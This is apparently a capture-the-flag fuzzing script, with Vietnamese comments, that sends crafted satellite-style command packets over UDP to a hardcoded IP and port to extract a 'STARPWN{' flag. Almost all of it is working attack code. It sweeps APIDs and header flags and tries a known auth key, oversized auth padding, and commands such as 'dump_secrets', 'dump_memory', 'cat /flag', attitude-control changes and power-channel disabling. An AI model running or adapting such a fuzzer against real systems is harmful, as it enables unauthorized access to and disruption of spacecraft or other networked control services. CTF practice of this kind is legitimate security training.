#!/usr/bin/env python3
# fuzz_get_flag.py
import socket, struct, time, binascii, sys

TARGET_IP = "34.205.255.133" 
TARGET_PORT = 41057
TIMEOUT = 0.6

def build_packet(auth_key, apid, cmd, packet_type=1, sec_header_flag=1, seq_cnt=1, force_data_length=None):
    version = 0
    ptype = 1 if packet_type else 0
    secf = 1 if sec_header_flag else 0
    id_field = apid & 0x7FF
    data = b'\x00'*10 + auth_key.encode('utf-8')
    data_length = len(data) if force_data_length is None else force_data_length
    packet_id = (version << 13) | (ptype << 12) | (secf << 11) | id_field
    seq_flags = 0
    seq_cnt = seq_cnt & 0x3FFF
    primary_header = struct.pack('>HHH', packet_id, (seq_flags << 14) | seq_cnt, data_length - 1)
    return primary_header + data + cmd.encode('utf-8')

def send_recv(pkt, timeout=TIMEOUT):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(timeout)
        try:
            s.sendto(pkt, (TARGET_IP, TARGET_PORT))
        except Exception as e:
            return []
        res = []
        t0 = time.time()
        while True:
            try:
                r, _ = s.recvfrom(8192)
                res.append(r)
            except socket.timeout:
                break
            if time.time() - t0 > timeout + 0.5:
                break
        return res

def dec(b):
    try:
        return b.decode('utf-8', errors='replace')
    except:
        return binascii.hexlify(b).decode()

# Configurable lists (chỉnh nếu muốn thu hẹp)
apid_list = list(range(0, 256))             # APID thử (nhanh: thử 0-255)
header_types = [(0,0), (0,1), (1,0), (1,1)] # (packet_type, sec_header_flag)
auth_variants = [
    "h4ckm3pl3453",       # known working auth
    "",                   # empty
    "A"*64,               # long padding
    "A"*120,              # longer
    "A"*120 + "get_flag", # embed
]
# commands to try (tập hợp mở rộng — thêm nếu có ý tưởng)
common_cmds = [
    "", "ping", "get_status", "get_flag", "reveal_flag", "dump_secrets", "dump_memory", "read_flash",
    "cat /flag", "show_flag", "secret", "get_secret", "read_secret", "download_config", "whoami", "auth_dump",
    "list_users", "get_telemetry", "system_info"
]
# generate param variants for adcs_set_orient and eps_disable_channel
adcs_modes = ["rcw", "mag"]
adcs_params = []
for m in adcs_modes:
    for x in (-2, -1, 0, 1, 2, 10, 22, 1337):
        for y in (0,1,2,17,98):
            for z in (0,1,2,98):
                adcs_params.append(f"adcs_set_orient {m} {x} {y} {z}")

eps_params = [f"eps_disable_channel {i}" for i in range(0,8)] + [f"eps_disable_channel {i}" for i in (10,16,32)]

# combine into final commands to test (limit count)
commands_to_try = common_cmds + adcs_params[:40] + eps_params

# safety: if target looks like per-team remote, you may want to reduce apid_list or commands_to_try
MAX_TESTS = 20000  # safety cap
count = 0

print("Starting fuzz. TARGET:", TARGET_IP, TARGET_PORT)
for ptype, secf in header_types:
    for apid in apid_list:
        for auth in auth_variants:
            for cmd in commands_to_try:
                if count >= MAX_TESTS:
                    print("Reached MAX_TESTS, stopping.")
                    sys.exit(0)
                pkt = build_packet(auth, apid, cmd, packet_type=ptype, sec_header_flag=secf)
                replies = send_recv(pkt)
                count += 1
                if replies:
                    for r in replies:
                        s = dec(r)
                        # quick print for feedback
                        print(f"[{count}] apid={apid} ptype={ptype} sec={secf} auth='{auth[:16]}' cmd='{cmd}' -> reply: {s}")
                        # check for flag pattern
                        if "STARPWN{" in s:
                            print("=== FOUND FLAG ===")
                            print(s)
                            sys.exit(0)
                        # also look for {} pair maybe containing the flag
                        if "{" in s and "}" in s:
                            between = s[s.find("{")+1:s.find("}")]
                            if 3 <= len(between) <= 120:
                                print("Possible brace-containing reply, show it:")
                                print(s)
                # small delay to be polite
                time.sleep(0.01)

print("Finished fuzzing (no STARPWN{ found). Tests run:", count)
